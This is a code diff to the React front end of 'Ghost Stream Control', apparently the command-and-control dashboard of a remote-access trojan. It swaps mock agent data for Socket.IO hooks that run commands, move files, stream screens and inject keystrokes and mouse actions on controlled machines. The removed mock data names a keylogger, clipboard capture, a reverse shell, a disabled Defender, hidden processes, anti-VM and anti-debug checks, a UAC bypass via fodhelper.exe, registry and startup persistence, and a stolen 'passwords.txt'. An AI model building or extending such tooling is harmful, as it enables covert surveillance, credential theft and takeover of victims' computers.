@@ -1,5 +1,5 @@
 import { useEffect, useMemo, useState } from "react";
-import { useWebSocket } from "@/hooks/useWebSocket";
+import { useSocketIO } from "@/hooks/useSocketIO";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -24,7 +24,10 @@ import SecurityControlPanel from "@/components/security/SecurityControlPanel";
 import PersistenceControlPanel from "@/components/persistence/PersistenceControlPanel";
 import MonitoringControlPanel from "@/components/monitoring/MonitoringControlPanel";
 import FileTransferPanel from "@/components/filetransfer/FileTransferPanel";
-import type { Agent, DashboardMetrics } from "@/types/dashboard";
+import AgentControlPanel from "@/components/agent/AgentControlPanel";
+import WebRTCMonitor from "@/components/webrtc/WebRTCMonitor";
+import type { Agent } from "@/types/agent";
+import type { DashboardMetrics } from "@/types/dashboard";
 
 // Small helper to update meta for SEO
 const setMeta = (name: string, content: string) => {
@@ -82,119 +85,48 @@ const Index = () => {
   const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
   const [activePanel, setActivePanel] = useState<string | null>(null);
 
-  // WebSocket connection for real-time updates
-  const { isConnected, lastMessage, sendMessage } = useWebSocket('ws://localhost:8080/ws');
+  // Socket.IO connection for real-time updates
+  const {
+    socket,
+    isConnected,
+    agents,
+    commandResults,
+    configStatus,
+    fileTransfers,
+    webrtcStats,
+    qualityData,
+    productionReadiness,
+    executeCommand,
+    getAgentStats,
+    getSystemHealth,
+    listProcesses,
+    refreshDashboard,
+    uploadFile,
+    downloadFile,
+    startWebRTCStreaming,
+    stopWebRTCStreaming,
+    getWebRTCStats,
+    setWebRTCQuality,
+    getProductionReadiness,
+    sendKeyPress,
+    sendMouseMove,
+    sendMouseClick,
+    changePassword,
+    getConfigStatus
+  } = useSocketIO();
 
-  // Mock agent data - in real implementation, this would come from WebSocket
-  const [agents, setAgents] = useState<Agent[]>([
-    {
-      id: "agent-001",
-      hostname: "DESKTOP-ABC123",
-      ip: "192.168.1.100",
-      os: "Windows 11 Pro",
-      status: "online",
-      lastSeen: "2024-01-15T14:35:00Z",
-      capabilities: ["screen", "camera", "audio", "keylogger", "clipboard"],
-      streams: { screen: true, camera: false, audio: true },
-      persistence: { registry: true, startup: true, scheduledTasks: false, services: true },
-      security: { defenderDisabled: true, avDisabled: false, processHidden: true, antiVm: true, antiDebug: true },
-      privileges: { admin: true, uacBypassed: true, method: "fodhelper.exe" }
-    },
-    {
-      id: "agent-002", 
-      hostname: "LAPTOP-XYZ789",
-      ip: "192.168.1.101",
-      os: "Windows 10 Home",
-      status: "offline",
-      lastSeen: "2024-01-15T13:20:00Z",
-      capabilities: ["screen", "keylogger"],
-      streams: { screen: false, camera: false, audio: false },
-      persistence: { registry: false, startup: true, scheduledTasks: true, services: false },
-      security: { defenderDisabled: false, avDisabled: false, processHidden: false, antiVm: false, antiDebug: false },
-      privileges: { admin: false, uacBypassed: false, method: "" }
+  // Get config status on component mount
+  useEffect(() => {
+    if (isConnected) {
+      getConfigStatus();
+      getProductionReadiness();
     }
-  ]);
-
-  // Mock file transfers
-  const [fileTransfers, setFileTransfers] = useState([
-    {
-      id: "transfer-001",
-      filename: "passwords.txt",
-      size: 1024000,
-      progress: 75,
-      direction: "download" as const,
-      status: "active" as const,
-      speed: 102400
-    },
-    {
-      id: "transfer-002", 
-      filename: "screenshot.png",
-      size: 2048000,
-      progress: 100,
-      direction: "upload" as const,
-      status: "completed" as const,
-      speed: 0
-    }
-  ]);
+  }, [isConnected, getConfigStatus, getProductionReadiness]);
 
   useEffect(() => {
     document.title = "Ghost Stream Control – Security Dashboard";
     setMeta("description", "Realtime security, streaming and controller status dashboard with interactive charts.");
   }, []);
-
-  // Handle WebSocket messages
-  useEffect(() => {
-    if (lastMessage) {
-      console.log('Received WebSocket message:', lastMessage);
-      // Handle different message types
-      switch (lastMessage.type) {
-        case 'agent_update':
-          setAgents(prev => prev.map(agent => 
-            agent.id === lastMessage.data.id ? { ...agent, ...lastMessage.data } : agent
-          ));
-          break;
-        case 'metrics_update':
-          // Update dashboard metrics
-          break;
-      }
-    }
-  }, [lastMessage]);
-
-  // Agent control handlers
-  const handleStreamToggle = (agentId: string, type: 'screen' | 'camera' | 'audio', action: 'start' | 'stop') => {
-    sendMessage({
-      type: 'stream_control',
-      data: { agentId, streamType: type, action }
-    });
-  };
-
-  const handleSecurityAction = (agentId: string, action: string, params?: any) => {
-    sendMessage({
-      type: 'security_control',
-      data: { agentId, action, params }
-    });
-  };
-
-  const handlePersistenceAction = (agentId: string, method: string, action: string, params?: any) => {
-    sendMessage({
-      type: 'persistence_control',
-      data: { agentId, method, action, params }
-    });
-  };
-
-  const handleMonitoringAction = (agentId: string, type: string, action: string, params?: any) => {
-    sendMessage({
-      type: 'monitoring_control',
-      data: { agentId, type, action, params }
-    });
-  };
-
-  const handleFileAction = (agentId: string, action: string, params?: any) => {
-    sendMessage({
-      type: 'file_control',
-      data: { agentId, action, params }
-    });
-  };
 
   // Overview donut datasets
   const agentReport = useMemo(() => (
@@ -394,7 +326,7 @@ const Index = () => {
                           size="sm"
                           onClick={() => {
                             setSelectedAgent(agent.id);
-                            setActivePanel('streaming');
+                            setActivePanel('control');
                           }}
                           disabled={agent.status !== 'online'}
                         >
@@ -409,28 +341,28 @@ const Index = () => {
                     variant="secondary"
                     className="justify-start font-medium"
                     style={{ backgroundImage: "var(--gradient-primary)" }}
-                    onClick={() => setActivePanel('overview')}
+                    onClick={getAgentStats}
                   >
                     Agent Stats
                   </Button>
                   <Button 
                     variant="secondary" 
                     className="justify-start bg-muted/30"
-                    onClick={() => setActivePanel('health')}
+                    onClick={getSystemHealth}
                   >
                     System Health
                   </Button>
                   <Button 
                     variant="secondary" 
                     className="justify-start bg-muted/30"
-                    onClick={() => setActivePanel('processes')}
+                    onClick={listProcesses}
                   >
                     List Processes
                   </Button>
                   <Button 
                     variant="secondary" 
                     className="justify-start bg-muted/30"
-                    onClick={() => window.location.reload()}
+                    onClick={refreshDashboard}
                   >
                     Refresh Dashboard
                   </Button>
@@ -513,124 +445,91 @@ const Index = () => {
             </CardContent>
           </Card>
           <div className="md:col-span-12 lg:col-span-3 grid gap-6">
-            <ConfigStatusCard />
+            <Card>
+              <CardHeader className="flex flex-row items-center justify-between space-y-0">
+                <CardTitle>Config Status</CardTitle>
+                <span className="text-xs text-muted-foreground">
+                  Last updated: {configStatus ? new Date().toLocaleTimeString() : '—'}
+                </span>
+              </CardHeader>
+              <CardContent>
+                <div className="space-y-1">
+                  <div className="flex items-center justify-between py-1">
+                    <span className="text-sm text-muted-foreground">Admin password set</span>
+                    <span className="text-sm font-semibold">
+                      {configStatus?.admin_password_set ? 'Yes' : 'No'}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between py-1">
+                    <span className="text-sm text-muted-foreground">Secret key</span>
+                    <span className="text-sm font-semibold">
+                      {configStatus?.secret_key_set ? 'Set' : 'Not Set'}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between py-1">
+                    <span className="text-sm text-muted-foreground">Session timeout</span>
+                    <span className="text-sm font-semibold">
+                      {configStatus?.session_timeout || 3600}s
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between py-1">
+                    <span className="text-sm text-muted-foreground">Blocked IPs</span>
+                    <span className="text-sm font-semibold">
+                      {configStatus?.blocked_ips?.length || 0}
+                    </span>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
             <PasswordManagementCard />
           </div>
         </div>
 
-        {/* Agent Control Panels */}
+        {/* WebRTC Production Monitor */}
+        <WebRTCMonitor
+          productionReadiness={productionReadiness}
+          qualityData={qualityData}
+          onGetProductionReadiness={getProductionReadiness}
+          onGetMigrationPlan={() => console.log('Get migration plan')}
+          onGetMonitoringData={() => console.log('Get monitoring data')}
+        />
+
+        {/* Agent Control Panel */}
         {selectedAgent && activePanel && (
           <div className="space-y-6">
             <div className="flex items-center justify-between">
               <h2 className="text-xl font-semibold">
                 Agent Control - {agents.find(a => a.id === selectedAgent)?.hostname}
               </h2>
-              <div className="flex gap-2">
-                <Button
-                  variant={activePanel === 'streaming' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('streaming')}
-                >
-                  Streaming
-                </Button>
-                <Button
-                  variant={activePanel === 'security' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('security')}
-                >
-                  Security
-                </Button>
-                <Button
-                  variant={activePanel === 'persistence' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('persistence')}
-                >
-                  Persistence
-                </Button>
-                <Button
-                  variant={activePanel === 'monitoring' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('monitoring')}
-                >
-                  Monitoring
-                </Button>
-                <Button
-                  variant={activePanel === 'files' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('files')}
-                >
-                  Files
-                </Button>
-                <Button
-                  variant="ghost"
-                  size="sm"
-                  onClick={() => {
-                    setSelectedAgent(null);
-                    setActivePanel(null);
-                  }}
-                >
-                  Close
-                </Button>
-              </div>
+              <Button
+                variant="ghost"
+                size="sm"
+                onClick={() => {
+                  setSelectedAgent(null);
+                  setActivePanel(null);
+                }}
+              >
+                Close
+              </Button>
             </div>
 
-            {activePanel === 'streaming' && selectedAgent && (
-              <StreamingControlPanel
-                agentId={selectedAgent}
-                streams={{
-                  screen: { active: true, bitrate: 2500, fps: 30, resolution: "1920x1080" },
-                  camera: { active: false, bitrate: 0, fps: 0, resolution: "640x480" },
-                  audio: { active: true, bitrate: 128, sampleRate: 44100 }
-                }}
-                onStreamToggle={(type, action) => handleStreamToggle(selectedAgent, type, action)}
-              />
-            )}
-
-            {activePanel === 'security' && selectedAgent && (
-              <SecurityControlPanel
-                agentId={selectedAgent}
-                security={agents.find(a => a.id === selectedAgent)?.security || {
-                  defenderDisabled: false,
-                  avDisabled: false,
-                  processHidden: false,
-                  antiVm: false,
-                  antiDebug: false
-                }}
-                onSecurityAction={(action, params) => handleSecurityAction(selectedAgent, action, params)}
-              />
-            )}
-
-            {activePanel === 'persistence' && selectedAgent && (
-              <PersistenceControlPanel
-                agentId={selectedAgent}
-                persistence={{
-                  registry: { active: true, count: 3, entries: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Agent"] },
-                  startup: { active: true, count: 1, entries: ["C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\agent.exe"] },
-                  scheduledTasks: { active: false, count: 0, entries: [] },
-                  services: { active: true, count: 1, entries: ["GhostService"] }
-                }}
-                onPersistenceAction={(method, action, params) => handlePersistenceAction(selectedAgent, method, action, params)}
-              />
-            )}
-
-            {activePanel === 'monitoring' && selectedAgent && (
-              <MonitoringControlPanel
-                agentId={selectedAgent}
-                monitoring={{
-                  keylogger: { active: true, keyCount: 1247, lastActivity: "2024-01-15T14:35:20Z" },
-                  clipboard: { active: true, clipCount: 23, lastClipboard: "https://example.com/secret" },
-                  reverseShell: { active: false, commandCount: 0, lastCommand: "" },
-                  voiceControl: { active: false, commandCount: 0, lastCommand: "" }
-                }}
-                onMonitoringAction={(type, action, params) => handleMonitoringAction(selectedAgent, type, action, params)}
-              />
-            )}
-
-            {activePanel === 'files' && selectedAgent && (
-              <FileTransferPanel
-                agentId={selectedAgent}
-                transfers={fileTransfers}
-                onFileAction={(action, params) => handleFileAction(selectedAgent, action, params)}
+            {activePanel === 'control' && selectedAgent && (
+              <AgentControlPanel
+                agent={agents.find(a => a.id === selectedAgent)!}
+                commandResults={commandResults}
+                fileTransfers={fileTransfers}
+                webrtcStats={webrtcStats[selectedAgent]}
+                qualityData={qualityData[selectedAgent]}
+                onExecuteCommand={(command) => executeCommand(selectedAgent, command)}
+                onUploadFile={(file, path) => uploadFile(selectedAgent, file, path)}
+                onDownloadFile={(filename, path) => downloadFile(selectedAgent, filename, path)}
+                onStartStreaming={(type) => startWebRTCStreaming(selectedAgent, type)}
+                onStopStreaming={() => stopWebRTCStreaming(selectedAgent)}
+                onSetQuality={(quality) => setWebRTCQuality(selectedAgent, quality)}
+                onGetStats={() => getWebRTCStats(selectedAgent)}
+                onKeyPress={(key, modifiers) => sendKeyPress(selectedAgent, key, modifiers)}
+                onMouseMove={(x, y) => sendMouseMove(selectedAgent, x, y)}
+                onMouseClick={(x, y, button) => sendMouseClick(selectedAgent, x, y, button)}
               />
             )}
           </div>
